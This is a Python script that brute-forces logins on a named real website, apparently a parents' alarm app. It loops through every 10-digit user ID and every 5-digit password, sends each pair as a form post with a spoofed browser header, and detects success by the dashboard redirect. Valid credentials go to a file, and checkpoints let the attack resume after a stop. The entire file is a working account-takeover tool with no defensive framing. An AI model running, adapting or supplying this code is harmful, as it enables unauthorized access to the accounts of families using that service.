#!/usr/bin/env python3
import requests
import time
import os
import sys
import signal
import json
from datetime import datetime

# Configuration
BASE_URL = "https://parentsalarmapp.com"
LOGIN_URL = f"{BASE_URL}/"
USER_FIELD = "LoginId"
PASS_FIELD = "LoginPassword"
SUBMIT_FIELD = "command"
SUBMIT_VALUE = "SIGN IN"

TIMEOUT = 15
REQUEST_DELAY = 0.2  # Adjust based on server tolerance
MAX_RETRIES = 3

# ID and Password ranges
ID_START = 1000000000
ID_END = 9999999999  # All 10-digit IDs
PASS_START = 11111
PASS_END = 99999  # All 5-digit passwords

# File paths (Cross-platform compatible)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CHECKPOINT_FILE = os.path.join(BASE_DIR, "checkpoint.json")
CREDENTIALS_FILE = os.path.join(BASE_DIR, "valid_credentials.txt")

class BruteforceSession:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })
        self.current_user_id = ID_START
        self.current_password = PASS_START
        self.total_tested = 0
        self.found_credentials = []
        self.start_time = time.time()
        self.running = True

    def load_checkpoint(self):
        if os.path.exists(CHECKPOINT_FILE):
            try:
                with open(CHECKPOINT_FILE, 'r') as f:
                    data = json.load(f)
                    self.current_user_id = data.get('current_user_id', ID_START)
                    self.current_password = data.get('current_password', PASS_START)
                    self.total_tested = data.get('total_tested', 0)
                    self.found_credentials = data.get('found_credentials', [])
                    print(f"RESUMING from User ID: {self.current_user_id}, Password: {self.current_password}")
            except Exception as e:
                print(f"Error loading checkpoint: {e}")

    def save_checkpoint(self):
        data = {
            'current_user_id': self.current_user_id,
            'current_password': self.current_password,
            'total_tested': self.total_tested,
            'found_credentials': self.found_credentials,
            'last_updated': datetime.now().isoformat()
        }
        try:
            with open(CHECKPOINT_FILE, 'w') as f:
                json.dump(data, f, indent=4)
        except Exception as e:
            print(f"Error saving checkpoint: {e}")

    def log_success(self, user_id, password):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] User: {user_id} | Pass: {password}\n"
        print(f"\n🎉 SUCCESS FOUND: {user_id}:{password}")
        
        self.found_credentials.append({'user': user_id, 'pass': password})
        
        try:
            with open(CREDENTIALS_FILE, 'a') as f:
                f.write(entry)
        except Exception as e:
            print(f"Error writing to credentials file: {e}")

    def attempt_login(self, user_id, password):
        for attempt in range(MAX_RETRIES):
            try:
                # Reset cookies for fresh attempt
                self.session.cookies.clear()
                
                # Get login page to refresh session/CSRF if needed
                # self.session.get(LOGIN_URL, timeout=TIMEOUT) # Uncomment if CSRF token is needed from page

                payload = {
                    USER_FIELD: user_id,
                    PASS_FIELD: password,
                    SUBMIT_FIELD: SUBMIT_VALUE
                }

                response = self.session.post(
                    LOGIN_URL,
                    data=payload,
                    allow_redirects=True,
                    timeout=TIMEOUT
                )

                if "mobiledashboard" in response.url:
                    return True
                return False

            except requests.RequestException as e:
                if attempt < MAX_RETRIES - 1:
                    time.sleep(REQUEST_DELAY * 2)
                else:
                    return False
        return False

    def run(self):
        total_combinations = (ID_END - ID_START + 1) * (PASS_END - PASS_START + 1)
        
        print("\n" + "=" * 60)
        print("Starting comprehensive ID and password test")
        print(f"Optimized for Windows & Mac")
        print(f"Saving progress to: {CHECKPOINT_FILE}")
        print(f"Saving found keys to: {CREDENTIALS_FILE}")
        print("=" * 60 + "\n")

        # Register signal handler for graceful exit
        def signal_handler(sig, frame):
            print("\n\nStopping... Saving progress...")
            self.running = False
            self.save_checkpoint()
            sys.exit(0)

        signal.signal(signal.SIGINT, signal_handler)

        for user_id in range(self.current_user_id, ID_END + 1):
            user_id_str = str(user_id)
            user_found = False
            
            # If we are resuming, start from the saved password, otherwise start from PASS_START
            start_pass = self.current_password if user_id == self.current_user_id else PASS_START
            
            # Print current User ID being tested
            print(f"Testing User ID: {user_id_str} | Start Pass: {start_pass}")

            for password in range(start_pass, PASS_END + 1):
                if not self.running:
                    return

                self.current_user_id = user_id
                self.current_password = password
                
                password_str = str(password).zfill(5)
                
                if self.attempt_login(user_id_str, password_str):
                    self.log_success(user_id_str, password_str)
                    user_found = True
                    # Decide if we break or continue finding more passwords for same user
                    # break 
                
                self.total_tested += 1
                
                # feedback
                if self.total_tested % 100 == 0:
                    sys.stdout.write(f"\rTested: {self.total_tested:,} | Current: {user_id_str}:{password_str}")
                    sys.stdout.flush()
                
                # Checkpoint every 500
                if self.total_tested % 500 == 0:
                    self.save_checkpoint()

                time.sleep(REQUEST_DELAY)

            # Reset password start for next user
            self.current_password = PASS_START
            
            if user_found:
                print(f"\nFinished User ID: {user_id_str} (Found Credentials)")
            
            # Save checkpoint after every user completion
            self.save_checkpoint()

        print("\n" + "=" * 60)
        print("TEST COMPLETED")
        print(f"Total combinations tested: {self.total_tested:,}")
        print("=" * 60)

if __name__ == "__main__":
    tester = BruteforceSession()
    tester.load_checkpoint()
    tester.run()